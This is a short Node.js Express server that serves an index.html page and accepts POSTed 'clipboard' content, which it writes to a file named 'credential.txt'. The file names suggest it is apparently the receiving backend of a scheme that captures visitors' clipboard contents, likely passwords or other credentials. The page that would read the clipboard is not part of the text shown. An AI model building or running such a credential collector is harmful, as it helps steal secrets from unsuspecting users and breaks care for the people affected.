
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Serve the HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Endpoint to save clipboard content
app.post('/save-clipboard', (req, res) => {
    const { content } = req.body;

    fs.writeFile('credential.txt', content, (err) => {
        if (err) {
            console.error('Failed to write file', err);
            return res.status(500).send('Failed to save content');
        }
        res.send('Content saved successfully');
    });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
